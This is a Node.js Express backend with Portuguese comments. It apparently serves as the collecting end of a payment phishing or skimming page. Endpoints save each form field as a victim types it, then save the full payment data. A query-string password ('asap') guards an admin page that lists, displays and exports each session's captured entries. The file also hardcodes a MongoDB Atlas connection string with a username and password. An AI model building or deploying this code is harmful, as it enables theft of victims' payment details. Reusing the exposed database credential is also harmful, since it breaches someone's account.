// app.js - Backend completo com MongoDB, admin, sessionId e exportação TXT
import express from "express";
import cors from "cors";
import mongoose from "mongoose";
import path from "path";
import { fileURLToPath } from "url";
import { v4 as uuidv4 } from "uuid";

// MongoDB Atlas string já com senha fornecida
const MONGO_URI = "mongodb+srv://igorlcreis:PskuwOrsMTaZFnGU@cluster0.xcdkhke.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 7860;

// MongoDB Connection
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("MongoDB Atlas conectado!"))
  .catch(err => console.error("Erro ao conectar MongoDB:", err));

// Schemas
const CapturaSchema = new mongoose.Schema({
  sessionId: String,
  campo: String,
  valor: String,
  data: { type: Date, default: Date.now }
});
const PagamentoSchema = new mongoose.Schema({
  sessionId: String,
  dados: Object,
  data: { type: Date, default: Date.now }
});

const Captura = mongoose.model("Captura", CapturaSchema);
const Pagamento = mongoose.model("Pagamento", PagamentoSchema);

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Captura progressiva (cada campo)
app.post("/captura_campo", async (req, res) => {
  const { sessionId, campo, valor } = req.body;
  if (!campo || valor === undefined || !sessionId) return res.status(400).send("Dados inválidos");
  await Captura.create({ sessionId, campo, valor });
  res.sendStatus(200);
});

// Captura final (todos os campos ao finalizar)
app.post("/captura_final", async (req, res) => {
  const { sessionId, ...dados } = req.body;
  if (!sessionId) return res.status(400).send("Dados inválidos");
  await Pagamento.create({ sessionId, dados });
  res.sendStatus(200);
});

// Admin protegida com visualização e exportação por sessionId
app.get("/admin", async (req, res) => {
  const senha = req.query.senha;
  const session = req.query.session;
  const exportar = req.query.exportar;

  if (senha !== "asap") return res.status(401).send("Acesso negado!");

  // Busca sessionIds distintos
  const sessions = await Captura.distinct("sessionId");
  let sessionList = "";
  sessions.forEach(s => {
    sessionList += `<option value="${s}"${session === s ? " selected" : ""}>${s}</option>`;
  });

  // Filtra por sessionId selecionado
  let capturas = [];
  let pagamentos = [];
  if (session) {
    capturas = await Captura.find({ sessionId: session }).sort({ data: 1 }).lean();
    pagamentos = await Pagamento.find({ sessionId: session }).sort({ data: 1 }).lean();
  }

  // Exportação TXT
  if (exportar === "txt" && session) {
    let txt = "";
    txt += "CAPTURAS\n";
    capturas.forEach(c => {
      txt += `${c.data.toLocaleString()} | ${c.campo}: ${c.valor}\n`;
    });
    txt += "\nPAGAMENTOS FINALIZADOS\n";
    pagamentos.forEach(p => {
      txt += `${p.data.toLocaleString()} | ${JSON.stringify(p.dados, null, 2)}\n\n`;
    });
    res.setHeader("Content-disposition", `attachment; filename=exportacao_${session}.txt`);
    res.setHeader("Content-Type", "text/plain");
    return res.send(txt);
  }

  res.send(`
    <html>
    <head><title>Admin - MongoDB</title>
    <style>
      body { font-family: Quicksand, Arial, sans-serif; background:#faf4fd; color:#322; }
      .main { max-width:820px; margin:28px auto; background:#fff; border-radius:16px; box-shadow:0 2px 18px #be429931; padding:28px; }
      h1 { color:#be4299; }
      pre { background:#ffe4ec; border-radius:10px; padding:15px; font-size:1em; }
      .section { margin-bottom: 28px; }
      select { font-size:1em; }
      button { margin-left: 10px; padding: 4px 12px; font-size:1em; }
    </style>
    </head>
    <body>
      <div class="main">
      <h1>Administração - MongoDB Capturas</h1>
      <form method="get" action="/admin" style="margin-bottom:20px;">
        <input type="hidden" name="senha" value="asap">
        <label>Selecione o usuário (sessionId):
          <select name="session" onchange="this.form.submit()">
            <option value="">-- Selecione --</option>
            ${sessionList}
          </select>
        </label>
        ${session ? `<button type="submit" name="exportar" value="txt">Exportar TXT</button>` : ""}
      </form>
      ${session ? `
      <div class="section">
        <h2>Campos Digitados</h2>
        <pre>${capturas.map(c => `${c.data.toLocaleString()} | ${c.campo}: ${c.valor}`).join('\n')}</pre>
      </div>
      <div class="section">
        <h2>Pagamentos Finalizados</h2>
        <pre>${pagamentos.map(p => `${p.data.toLocaleString()} | ${JSON.stringify(p.dados, null, 2)}`).join('\n\n')}</pre>
      </div>
      ` : "<p>Selecione um usuário para visualizar e exportar dados.</p>"}
      </div>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log("Servidor rodando em http://localhost:" + PORT);
});
